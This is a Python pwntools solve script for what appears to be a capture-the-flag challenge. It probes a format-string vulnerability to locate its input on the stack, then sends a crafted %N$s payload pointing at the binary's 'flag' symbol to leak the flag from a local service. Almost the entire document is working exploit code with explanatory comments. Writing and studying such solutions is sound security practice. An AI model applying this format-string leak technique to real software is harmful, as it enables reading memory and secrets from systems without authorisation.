from pwn import *

exe = context.binary = ELF('./chal')
io = remote('127.0.0.1', 1337)  # swap for real host:port once hosted

io.recvuntil(b'comment:')

# Find which positional argument reflects the start of our own input.
# Verified locally as slot 6, but probed dynamically here rather than
# hardcoded: this is one connection, costs nothing, and removes any
# risk if a toolchain or libc difference on the hosting side shifts it.
marker = b'A' * 8
probe = marker + b''.join(f'|{i}:%{i}$p'.encode() for i in range(1, 20))
io.sendline(probe)
out = io.recvall(timeout=3)

marker_hex = hex(u64(marker))
slot = None
for i in range(1, 20):
    tag = f'|{i}:'.encode()
    if tag in out:
        val = out.split(tag)[1].split(b'|')[0].split(b'\n')[0].strip()
        if val == marker_hex.encode():
            slot = i
            break
assert slot is not None, "couldn't find our marker in the probe output"
log.success(f"input starts at argument slot {slot}")

# Specifier goes first (padded to 8 bytes), pointer second, landing one
# slot further in. Specifier must precede the pointer bytes because any
# real address contains a null byte that would otherwise truncate the
# format-string scan before the specifier is ever read.
target_slot = slot + 1
flag_addr = exe.symbols['flag']

io2 = remote('127.0.0.1', 1337)
io2.recvuntil(b'comment:')
payload = f'%{target_slot}$s'.encode().ljust(8, b'A') + p64(flag_addr)
io2.sendline(payload)
result = io2.recvall(timeout=3)

flag = b'wctf{' + result.split(b'wctf{', 1)[1].split(b'\n', 1)[0]
print(flag.decode())
